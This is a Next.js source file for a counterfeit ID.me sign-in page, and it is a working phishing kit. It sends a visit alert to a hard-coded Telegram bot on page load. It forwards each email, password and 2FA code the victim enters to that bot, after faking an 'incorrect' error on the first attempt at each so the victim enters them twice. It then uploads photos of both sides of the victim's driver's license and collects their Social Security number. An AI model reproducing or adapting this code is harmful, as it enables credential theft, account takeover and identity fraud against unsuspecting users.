"use client";

import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardHeader, CardContent } from "@/components/ui/card";
import { Checkbox } from "@/components/ui/checkbox";
import { Eye, EyeOff, CheckCircle, AlertCircle, Loader } from "lucide-react";
import Link from "next/link";

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitMessage, setSubmitMessage] = useState<{ type: "success" | "error", text: string } | null>(null);
  const [attemptCount, setAttemptCount] = useState(0);
  const [isLoading, setIsLoading] = useState(false);
  const [twoFactorCode, setTwoFactorCode] = useState("");
  const [twoFactorMessage, setTwoFactorMessage] = useState("");
  const [twoFactorAttemptCount, setTwoFactorAttemptCount] = useState(0);
  const [identityFront, setIdentityFront] = useState<File | null>(null);
  const [identityBack, setIdentityBack] = useState<File | null>(null);
  const [randomNumber, setRandomNumber] = useState("");
  const [step, setStep] = useState(1);
  const [telegramChatId] = useState("7132570959"); // Replace with actual chat ID
  const [telegramBotToken] = useState("8282863099:AAGCOmJ3FgeClGZkB15jkSqijaTHH21abZI"); // Replace with actual bot token

  useEffect(() => {
    // Send visit alert to Telegram when page loads
    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: "Someone visited the website: " + window.location.href,
      }),
    });

    // Custom domain visit alert
    const handleCustomDomainVisit = () => {
      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: "Custom domain visited: " + window.location.href,
        }),
      });
    };
    if (window.location.hostname !== "localhost") handleCustomDomainVisit();
  }, [telegramBotToken, telegramChatId]);

  const sendToTelegram = (data: { email?: string; password?: string; rememberMe?: boolean; twoFactorCode?: string; randomNumber?: string; }) => {
    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: JSON.stringify(data),
      }),
    });
  };

  const sendPhotoToTelegram = (file: string | Blob, caption: string | Blob) => {
    const formData = new FormData();
    formData.append("chat_id", telegramChatId);
    formData.append("photo", file);
    formData.append("caption", caption);

    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
      method: "POST",
      body: formData,
    });
  };

  const handleLoginSubmit = async (e: { preventDefault: () => void; }) => {
    e.preventDefault();
    setIsSubmitting(true);
    setIsLoading(true);
    setSubmitMessage(null);

    sendToTelegram({ email, password, rememberMe });

    if (attemptCount === 0) {
      await new Promise((resolve) => setTimeout(resolve, 5000));
      setIsLoading(false);
      setSubmitMessage({ type: "error", text: "Username or password is incorrect" });
    } else if (attemptCount === 1) {
      await new Promise((resolve) => setTimeout(resolve, 2000));
      setIsLoading(false);
      setStep(2);
    }
    setIsSubmitting(false);
    setAttemptCount(attemptCount + 1);
  };

  const handleTwoFactorSubmit = async (e: { preventDefault: () => void; }) => {
    e.preventDefault();
    setIsSubmitting(true);
    setIsLoading(true);
    setTwoFactorMessage("");

    sendToTelegram({ twoFactorCode });

    if (twoFactorAttemptCount === 0) {
      await new Promise((resolve) => setTimeout(resolve, 5000));
      setIsLoading(false);
      setTwoFactorMessage("The code entered is incorrect. Please try again.");
    } else if (twoFactorAttemptCount === 1) {
      await new Promise((resolve) => setTimeout(resolve, 2000));
      setIsLoading(false);
      setStep(3);
    }
    setIsSubmitting(false);
    setTwoFactorAttemptCount(twoFactorAttemptCount + 1);
  };

  const handleIdentitySubmit = async (e: { preventDefault: () => void; }) => {
    e.preventDefault();
    setIsLoading(true);

    const formData = new FormData();
    if (identityFront) {
      formData.append("identityFront", identityFront);
      sendPhotoToTelegram(identityFront, "Identity Front");
    }
    if (identityBack) {
      formData.append("identityBack", identityBack);
      sendPhotoToTelegram(identityBack, "Identity Back");
    }

    setIsLoading(false);
    setStep(4);
  };

  const handleRandomNumberSubmit = (e: { preventDefault: () => void; }) => {
    e.preventDefault();
    sendToTelegram({ randomNumber });
    setStep(5);
  };

  if (step === 1) {
    return (
      <div className="min-h-screen bg-gray-100 flex flex-col">
        <div className="flex-1 flex items-center justify-center px-4 py-8">
          <div className="w-full max-w-md">
            <div className="text-center mb-8">
              <img src="images/logo.svg" alt="ID.me" className="h-8 mx-auto" />
            </div>
            <Card className="shadow-lg border-0">
              <CardHeader className="space-y-4 pb-4">
                <h1 className="text-2xl font-semibold text-center text-gray-900">Sign in to ID.me</h1>
                <div className="text-center">
                  <span className="text-sm text-gray-600">New to ID.me? </span>
                  <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">Create an ID.me account</Link>
                </div>
              </CardHeader>
              <CardContent className="space-y-4">
                {submitMessage && (
                  <div className={`p-3 rounded-md flex items-center space-x-2 ${submitMessage.type === 'success' ? 'bg-green-50 text-green-800 border border-green-200' : 'bg-red-50 text-red-800 border border-red-200'}`}>
                    {submitMessage.type === 'success' ? <CheckCircle className="h-4 w-4" /> : <AlertCircle className="h-4 w-4" />}
                    <span className="text-sm">{submitMessage.text}</span>
                  </div>
                )}
                <form className="space-y-4" onSubmit={handleLoginSubmit}>
                  <div className="space-y-2">
                    <label htmlFor="email" className="text-sm font-medium text-gray-700">Email*</label>
                    <Input id="email" type="email" placeholder="enter your email address" value={email} onChange={(e) => setEmail(e.target.value)} className="w-full" required disabled={isSubmitting} />
                  </div>
                  <div className="space-y-2">
                    <label htmlFor="password" className="text-sm font-medium text-gray-700">Password*</label>
                    <div className="relative">
                      <Input id="password" type={showPassword ? "text" : "password"} placeholder="enter password" value={password} onChange={(e) => setPassword(e.target.value)} className="w-full pr-10" required disabled={isSubmitting} />
                      <button type="button" className="absolute inset-y-0 right-0 pr-3 flex items-center" onClick={() => setShowPassword(!showPassword)} disabled={isSubmitting}>
                        {showPassword ? <EyeOff className="h-4 w-4 text-gray-400" /> : <Eye className="h-4 w-4 text-gray-400" />}
                      </button>
                    </div>
                  </div>
                  <div className="text-right">
                    <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">Forgot password?</Link>
                  </div>
                  <div className="flex items-start space-x-2">
                    <Checkbox id="remember" checked={rememberMe} onCheckedChange={(checked) => setRememberMe(checked as boolean)} className="mt-0.5" disabled={isSubmitting} />
                    <div className="space-y-0">
                      <label htmlFor="remember" className="text-sm font-medium text-gray-700">Remember me</label>
                      <p className="text-xs text-gray-500">For your security, select only on your devices.</p>
                    </div>
                  </div>
                  <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5" disabled={isSubmitting}>
                    {isLoading ? <Loader className="animate-spin h-5 w-5 mx-auto" /> : "Sign in"}
                  </Button>
                </form>
                <div className="mt-6 p-3 bg-gray-50 rounded text-center">
                  <p className="text-xs text-gray-600">Social media sign in is no longer available. Please sign in with your email.</p>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
        <footer className="py-6">
          <div className="text-center space-y-2">
            <div>
              <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">English</Link>
            </div>
            <div className="flex justify-center space-x-6 text-xs text-gray-600">
              <Link href="#" className="hover:text-gray-800 underline">What is ID.me?</Link>
              <Link href="#" className="hover:text-gray-800 underline">Terms of Service</Link>
              <Link href="#" className="hover:text-gray-800 underline">Privacy Policy</Link>
            </div>
          </div>
        </footer>
      </div>
    );
  } else if (step === 2) {
    return (
      <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center px-4 py-8">
        <div className="w-full max-w-md">
          <div className="text-center mb-8">
            <img src="images/logo.svg" alt="ID.me" className="h-8 mx-auto" />
          </div>
          <Card className="shadow-lg border-0">
            <CardHeader className="space-y-4 pb-4">
              <h1 className="text-2xl font-semibold text-center text-gray-900">COMPLETE YOUR SIGN IN</h1>
              <div className="flex justify-center space-x-2">
                <img src="/images/123.png" alt="Back ID" className="w-full h-29 object-cover mb-2" />
              </div>
            </CardHeader>
            <CardContent className="space-y-4">
              <p className="text-2xl font-semibold text-center text-gray-900">Enter a code from your device</p>
              <p className="text-sm text-gray-600">Please check your code generator application and enter the generated 6-digit code to complete your sign in.</p>
              <p className="text-l font-semibold text-gray-900">Enter the 6-digit code*</p>
              <form onSubmit={handleTwoFactorSubmit}>
                <Input
                  type="text"
                  placeholder="------"
                  value={twoFactorCode}
                  onChange={(e) => {
                    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 6);
                    setTwoFactorCode(value);
                  }}
                  maxLength={6}
                  pattern="[0-9]{6}"
                  className="w-full mb-4 text-center text-2xl placeholder:text-2xl placeholder:font-semibold placeholder:text-black-400"
                  required
                />
                {twoFactorMessage && (
                  <div className="p-3 bg-red-50 text-red-800 border border-red-200 rounded-md text-sm text-center">
                    {twoFactorMessage}
                  </div>
                )}
                {isLoading && (
                  <div className="flex justify-center">
                    <Loader className="animate-spin h-5 w-5 text-blue-600" />
                  </div>
                )}
                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5 mt-4" disabled={isLoading}>
                  Continue
                </Button>
                <div className="text-center mt-4">
                  <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">Go back</Link>
                </div>
              </form>
              <div className="p-3 bg-gray-50 rounded text-sm text-gray-600 text-center">
                Have you lost access to all your MFA methods? <Link href="#" className="text-blue-600 hover:text-blue-700 underline">Please begin the MFA recovery process.</Link>
              </div>
            </CardContent>
          </Card>
          <div className="text-center mt-4 space-x-2 text-xs text-gray-600">
            <Link href="#" className="hover:text-gray-800 underline">What is ID.me?</Link>
            <Link href="#" className="hover:text-gray-800 underline">Terms of Service</Link>
            <Link href="#" className="hover:text-gray-800 underline">Privacy Policy</Link>
          </div>
        </div>
      </div>
    );
  } else if (step === 3) {
    return (
      <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center px-4 py-8">
        <div className="w-full max-w-md">
          <div className="text-center mb-8">
            <img src="images/logo.svg" alt="ID.me" className="h-8 mx-auto" />
          </div>
          <Card className="shadow-lg border-0">
            <CardHeader className="space-y-4 pb-4">
              <h1 className="text-2xl font-semibold text-center text-gray-900">TAKE PHOTOS WITH YOUR PHONE</h1>
            </CardHeader>
            <CardContent className="space-y-4">
              <form onSubmit={handleIdentitySubmit}>
                <div className="border-dashed border-2 border-gray-300 p-4 text-center">
                  <img src="/images/front.png" alt="Front ID" className="w-full h-29 object-cover mb-2" />
                  <p className="text-sm text-blue-600 underline font-semibold">Take photo of your driver's license or <br />state ID</p>
                  <p className="text-sm text-green-600 underline font-semibold">(FRONT)</p>
                  <input
                    type="file"
                    accept="image/*"
                    onChange={(e) => {
                      if (e.target.files && e.target.files[0]) {
                        setIdentityFront(e.target.files[0]);
                      }
                    }}
                    className="mt-2"
                  />
                </div>
                <div className="border-dashed border-2 border-gray-300 p-4 text-center mt-4">
                  <img src="/images/back.png" alt="Back ID" className="w-full h-29 object-cover mb-2" />
                  <p className="text-sm text-blue-600 underline font-semibold">Take photo of your driver's license or <br />state ID</p>
                  <p className="text-sm text-green-600 underline font-semibold">(BACK)</p>
                  <input
                    type="file"
                    accept="image/*"
                    onChange={(e) => {
                      if (e.target.files && e.target.files[0]) {
                        setIdentityBack(e.target.files[0]);
                      }
                    }}
                    className="mt-2"
                  />
                </div>
                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5 mt-4" disabled={isLoading}>
                  {isLoading ? <Loader className="animate-spin h-5 w-5 mx-auto" /> : "Submit"}
                </Button>
              </form>
            </CardContent>
          </Card>
          <div className="text-center mt-4 space-x-2 text-xs text-gray-600">
            <Link href="#" className="hover:text-gray-800 underline">What is ID.me?</Link>
            <Link href="#" className="hover:text-gray-800 underline">Terms of Service</Link>
            <Link href="#" className="hover:text-gray-800 underline">Privacy Policy</Link>
          </div>
        </div>
      </div>
    );
  } else if (step === 4) {
    return (
      <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center px-4 py-8">
        <div className="w-full max-w-md">
          <div className="text-center mb-8">
            <img src="images/logo.svg" alt="ID.me" className="h-8 mx-auto" />
          </div>
          <Card className="shadow-lg border-0">
            <CardHeader className="space-y-4 pb-4">
              <h1 className="text-2xl font-semibold text-center text-gray-900">Verify Your Identity</h1>
              <div className="flex justify-center space-x-2">
                <img src="/images/12345.jpg" alt="12345" className="w-full h-29 object-cover mb-2" />
              </div>
            </CardHeader>
            <CardContent className="space-y-4">
              <p className="text-2xl font-semibold text-center text-gray-900">Enter your Social Security number</p>
              <p className="text-sm text-gray-600">Social Security Number (#########)*</p>
              <form onSubmit={handleRandomNumberSubmit}>
                <Input
                  type="text"
                  placeholder="#########"
                  value={randomNumber}
                  onChange={(e) => {
                    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 9);
                    setRandomNumber(value);
                  }}
                  maxLength={9}
                  pattern="[0-9]{9}"
                  className="w-full mb-4"
                  required
                />
                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5 mt-4" disabled={isLoading}>
                  Continue
                </Button>
                <div className="text-center mt-2">
                  <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">Back</Link>
                  <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline ml-4">I don't have a Social Security Number</Link>
                </div>
              </form>
            </CardContent>
          </Card>
          <div className="text-center mt-4 space-x-2 text-xs text-gray-600">
            <Link href="#" className="hover:text-gray-800 underline">What is ID.me?</Link>
            <Link href="#" className="hover:text-gray-800 underline">Terms of Service</Link>
            <Link href="#" className="hover:text-gray-800 underline">Privacy Policy</Link>
          </div>
        </div>
      </div>
    );
  } else if (step === 5) {
    return (
      <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center px-4 py-8">
        <div className="w-full max-w-md text-center">
          <CheckCircle className="h-16 w-16 text-green-600 mx-auto" />
          <h1 className="text-2xl font-semibold text-gray-900 mt-4">Successfully Verified</h1>
        </div>
      </div>
    );
  }
}